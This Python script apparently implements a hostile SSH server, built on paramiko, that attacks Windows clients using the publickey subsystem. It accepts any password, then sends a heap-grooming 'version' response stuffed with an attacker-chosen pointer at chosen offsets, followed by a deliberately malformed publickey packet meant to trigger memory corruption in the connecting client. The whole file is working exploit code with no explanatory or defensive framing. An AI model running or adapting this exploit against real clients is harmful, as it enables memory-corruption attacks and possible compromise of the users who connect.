import argparse
import socket
import struct
import sys
import threading
import time

import paramiko


DEFAULT_HOST = "127.0.0.1"
DEFAULT_PORT = 2228
DEFAULT_VICTIM = 0x0000013370000000
LIST_ENTRY_SIZE_WIN64 = 48


def ssh_string(value):
    return struct.pack(">I", len(value)) + value


def subsystem_packet(payload):
    return struct.pack(">I", len(payload)) + payload


def version_response():
    return subsystem_packet(ssh_string(b"version") + struct.pack(">I", 2))


def version_groom_response(attrs_ptr, offsets):
    payload_len = 9 * LIST_ENTRY_SIZE_WIN64
    payload = bytearray(payload_len)
    prefix = ssh_string(b"version")
    payload[: len(prefix)] = prefix
    for offset in offsets:
        struct.pack_into("<Q", payload, offset, attrs_ptr)
    return subsystem_packet(bytes(payload))


def malformed_publickey_response():
    payload = ssh_string(b"publickey") + ssh_string(b"n") + b"\x00"
    return subsystem_packet(payload)


def recv_exact(channel, wanted):
    chunks = []
    total = 0
    while total < wanted:
        chunk = channel.recv(wanted - total)
        if not chunk:
            raise EOFError("channel closed")
        chunks.append(chunk)
        total += len(chunk)
    return b"".join(chunks)


def recv_subsystem_packet(channel):
    header = recv_exact(channel, 4)
    length = struct.unpack(">I", header)[0]
    return recv_exact(channel, length)


def send_all(channel, data):
    offset = 0
    while offset < len(data):
        sent = channel.send(data[offset:])
        if sent <= 0:
            raise EOFError("send failed")
        offset += sent


def serve_publickey_channel(channel, attrs_ptr, offsets, hold_seconds, done):
    try:
        client_version = recv_subsystem_packet(channel)
        print(f"server_recv_version_len={len(client_version)}", flush=True)
        send_all(channel, version_response())
        print("server_sent_version=1", flush=True)

        client_list = recv_subsystem_packet(channel)
        print(f"server_recv_list_len={len(client_list)}", flush=True)
        send_all(channel, version_groom_response(attrs_ptr, offsets))
        print(
            f"server_sent_groom_attrs=0x{attrs_ptr:016x} offsets={offsets}",
            flush=True,
        )
        send_all(channel, malformed_publickey_response())
        print("server_sent_malformed_publickey=1", flush=True)
        time.sleep(hold_seconds)
    except Exception as exc:
        print(f"server_error={exc}", flush=True)
    finally:
        done.set()
        try:
            channel.close()
        except Exception:
            pass


class PublickeyServer(paramiko.ServerInterface):
    def __init__(self, attrs_ptr, offsets, hold_seconds, done):
        self.attrs_ptr = attrs_ptr
        self.offsets = offsets
        self.hold_seconds = hold_seconds
        self.done = done

    def check_auth_password(self, username, password):
        print(f"auth username={username!r} password_len={len(password)}", flush=True)
        return paramiko.AUTH_SUCCESSFUL

    def get_allowed_auths(self, username):
        return "password"

    def check_channel_request(self, kind, chanid):
        print(f"channel_request kind={kind!r} chanid={chanid}", flush=True)
        if kind == "session":
            return paramiko.OPEN_SUCCEEDED
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED

    def check_channel_subsystem_request(self, channel, name):
        print(f"subsystem_request name={name!r}", flush=True)
        if name != "publickey":
            return False
        worker = threading.Thread(
            target=serve_publickey_channel,
            args=(
                channel,
                self.attrs_ptr,
                self.offsets,
                self.hold_seconds,
                self.done,
            ),
            daemon=True,
        )
        worker.start()
        return True


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--host", default=DEFAULT_HOST)
    parser.add_argument("--port", type=int, default=DEFAULT_PORT)
    parser.add_argument("--victim", type=lambda s: int(s, 0), default=DEFAULT_VICTIM)
    parser.add_argument(
        "--offset",
        dest="offsets",
        action="append",
        type=lambda s: int(s, 0),
        default=None,
    )
    parser.add_argument("--hold", type=float, default=2.0)
    args = parser.parse_args()
    offsets = args.offsets if args.offsets is not None else [27]
    host_key = paramiko.RSAKey.generate(2048)
    done = threading.Event()

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind((args.host, args.port))
    sock.listen(1)
    print(
        f"server_listening={args.host}:{args.port} victim=0x{args.victim:016x} offsets={offsets}",
        flush=True,
    )

    client, addr = sock.accept()
    print(f"server_client={addr[0]}:{addr[1]}", flush=True)
    transport = paramiko.Transport(client)
    transport.add_server_key(host_key)
    transport.start_server(
        server=PublickeyServer(args.victim, offsets, args.hold, done)
    )
    channel = transport.accept(20)
    if channel is None:
        print("server_no_channel=1", flush=True)
        return 1

    done.wait(20)
    transport.close()
    sock.close()
    print("server_done=1", flush=True)
    return 0


if __name__ == "__main__":
    sys.exit(main())
